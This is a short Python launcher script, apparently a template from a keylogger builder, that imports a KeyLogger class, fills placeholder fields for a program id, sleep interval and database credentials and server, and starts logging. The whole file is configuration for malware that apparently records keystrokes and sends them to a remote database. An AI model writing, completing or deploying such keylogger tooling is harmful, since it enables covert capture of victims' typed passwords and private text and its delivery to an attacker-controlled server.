#!/usr/bin/env python
from libs.keylogger import KeyLogger

program = '**p_id**'
SLEEP = '**sleep**'

db = {
    'Username': '**Uname**',
    'Db_name': '**dbname**',
    'Password': '**psswd**',
    'Server': '**server**',
    'Port': '**port**'
}

my_key_logger = KeyLogger(program, db['Username'], db['Password'], db['Db_name'], db['Server'], db['Port'], SLEEP)

my_key_logger.start()
